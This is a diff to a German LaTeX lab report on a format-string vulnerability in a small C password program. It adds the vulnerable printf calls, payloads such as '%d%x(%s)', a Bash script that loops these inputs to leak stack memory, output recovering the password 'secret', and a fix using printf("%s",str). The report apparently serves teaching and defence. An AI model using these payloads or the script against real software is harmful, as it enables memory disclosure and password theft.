@@ -1,4 +1,5 @@
 \section{App0}
+\subsection{Vulnerability: Format-String Vulnerability}
 Bei App0 handelt es sich um ein kleines C-Programm, dass nach einer Passwortabfrage, die überprüft wird zu einem kleinem Rechenprogramm weiterleitet. Stimmt das Passwort nicht mit dem gesuchten überein wird das Programm beendet. Das Passwort, so wie einige andere Character-Arrays (für Passwort *pwd), wurde Plain Text einfach in Variablen im Programm abgespeichert, die dann natürlich irgendwo, zur Laufzeit, am Stack liegen.\linebreak
 Stimmt das Passwort nun nicht überein, so wird die Eingabe nochmals in der Konsole ausgegeben:
 \begin{lstlisting}
@@ -8,13 +9,108 @@ I don't know!
 I don't know!
 
 \end{lstlisting}
-Sieht man sich den Code an, so findet man schnell eine StringFormat-Vulnerability. Denn die Ausgabe des Passworts passiert nur mit einem simplen
+Sieht man sich den Code an, so findet man schnell eine StringFormat-Vulnerability. Denn die Ausgabe des Passworts passiert vollkommen unformattiert.
 \begin{lstlisting}
-printf(input);
+if (strcmp(pwd, input) == 0) {
+    return 1;
+  } else {
+      printf(input); //Diese Zeile ist das Problem
+    
+    printf("\n");
+    return 0;
+  }
 \end{lstlisting}
 Wodurch man hier auch jegliche Speicheradressen angeben kann, um somit den Laufzeitspeicher + Stack gnadenlos zu durchwühlen. Dies ist möglich, indem man
 als Passwort z.B.:
 \begin{lstlisting}
 %d%x(%s)
 \end{lstlisting}
-eingibt. Bereits damit kann man auf eine Speicheradresse zugreifen, wo höchstwahrscheinlich eine String (bzw Char-Kette) aus dem laufenden Programm liegt. Ist der Speicherbereich leer bekommt man einen Segmentation Fault. 
+eingibt. Bereits damit kann man auf eine Speicheradresse zugreifen, wo höchstwahrscheinlich ein String (bzw eine Char-Kette) aus dem laufenden Programm liegt.
+Ist der Speicherbereich leer bekommt man einen Segmentation Fault. Will man nun um einen Speicherbereich weiterspringen
+und sehen, ob und was die nächste mögliche Adresse speichert, so sieht dies folgendermaßen aus:
+\begin{lstlisting}
+%d%d%x(%s)
+\end{lstlisting}
+Dies kann bis ins unendliche durchgespielt werden. Außerdem findet sich das selbe Problem auch in der Funktion startCalculator(),
+wo die eingegebenen Werte des Taschenrechners ausgegeben werden. Auch hier könnte man den selben Angriff starten:
+\begin{lstlisting}
+printf("Ergebnis fuer Rechnung: \n");
+      printf(a);
+      printf(op);
+      printf(b);
+      printf("=====\n");
+\end{lstlisting}
+\subsection{Script zur Automatisierung}
+Es wurde ein Bash-Script geschrieben, das diese Schwachstalle
+automatisiert ausnutzt: 
+\begin{lstlisting}
+#!/bin/sh
+make
+if [ $# -eq 0 ]
+then
+   echo "Error - Number missing form command line argument"
+   echo "Syntax : $0 number"
+exit 1
+fi
+n=$1
+input="%d%x(%s)"
+var="%d"
+i=0
+while [ $i -le $n ]
+do
+  echo $input | ./sfv
+  input=$var$input
+  i=`expr $i + 1`
+done
+\end{lstlisting}
+Es bekommt als Argument eine Zahl übergeben, wie oft die darunterliegenden Schleife durchlaufen werden soll, also wie
+viele aufeinanderfolgende Speicheradressen man sich ansehen möchte. Ruft man das Script mit Argument 5 auf sieht der 
+Output folgendermaßen aus:
+\begin{lstlisting}
+$ ./exploit.sh 10
+make: Für das Ziel »all« ist nichts zu tun.
+Passwort eingeben:
+./exploit.sh: Zeile 18: 12848 Fertig                  echo $input
+     15060 Segmentation fault      | ./sfv
+Passwort eingeben:
+./exploit.sh: Zeile 18:  4260 Fertig                  echo $input
+     14752 Segmentation fault      | ./sfv
+Passwort eingeben:
+./exploit.sh: Zeile 18:  4632 Fertig                  echo $input
+      9568 Segmentation fault      | ./sfv
+Passwort eingeben:
+./exploit.sh: Zeile 18:  4812 Fertig                  echo $input
+     13024 Segmentation fault      | ./sfv
+Passwort eingeben:
+2337844162899732816801720691680172069201571638929732528()
+
+Passwort eingeben:
+23378441628997328168017206916801720691680172069623409189a2973(secret
+)
+
+Passwort eingeben:
+23378441628997328168017206916801720691680172069201571638975461524020bb(test
+
+Passwort eingeben:
+233784416289973281680172069168017206916801720691680172069265219742026834020b5(
+Passwort eingeben:
+233784416289973281680172069168017206916801720691680172069245046942026834202677
+Passwort eingeben:
+233784416289973281680172069168017206916801720691680172069245046942026834202677
+Passwort eingeben:
+233784416289973281680172069168017206916801720691680172069245046942026834202677
+\end{lstlisting}
+Der Output ist natürlich systemabhängig und kann auf 32-bit Prozessoren ganz anders aussehen als auf 64-bit Prozessoren.
+Auch macht es einen Unterschied ob man Linux oder Linux-Emulatoren, wie das hier verwendete Cygwin, verwendet.
+Bekommt man keine Strings zurück gibt es entweder keine oder man sollte die Schleifendurchläufe erhöhen.
+In diesem Durchlauf sind wir auf 2 Strings gestoßen, test und secret. Letztes ist dann auch das gesuchte Passwort, das
+im Quellcode Plain-Text als Zeichenkette gespeichert wurde.
+\subsection{Lösung des Problems}
+Anstatt den vorher erwähnten print-Anweisungen sollten print-Anweisungen immer und überall mit Formats in der gewünschten
+Form verwendet werden. Für einen String würde das so aussehen:
+\begin{lstlisting}
+printf("%s",str);
+\end{lstlisting}
+Dies verhindert den unerwünschten Zugriff durch den in Anführungszeichen stehenden Platzhalter für den String.
+Führt man das Script nun in der gefixten Version des Programms aus, so bekommt man genau das vom Programm ausgegeben,
+was man auch eingegeben hat.
